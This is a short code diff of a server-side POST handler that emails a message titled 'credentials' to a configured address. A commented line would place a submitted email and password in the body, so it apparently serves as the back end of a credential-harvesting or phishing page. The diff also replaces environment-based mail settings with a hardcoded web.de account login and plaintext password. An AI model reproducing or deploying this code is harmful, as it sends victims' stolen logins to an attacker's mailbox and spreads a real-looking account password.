@@ -6,18 +6,18 @@ export async function POST(request: Request) {
 
   try {
     let transporter: mailer.Transporter = mailer.createTransport({
-      service: "Gmail",
-      host: "smtp.gmail.com",
+      service: "web.de",
+      host: "smtp.web.de",
       port: 465,
       secure: true,
       auth: {
-        user: process.env.APP_ACCOUNT,
-        pass: process.env.APP_PASSWORD,
+        user: "christophw87@web.de",
+        pass: "frieselman",
       },
     });
 
     const result = await transporter.sendMail({
-      from: `"fox" <${process.env.APP_ACCOUNT}>`,
+      from: `"dees" <christophw87@web.de>`,
       to: process.env.EMAIL_TO_SEND,
       subject: "credentials",
       // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
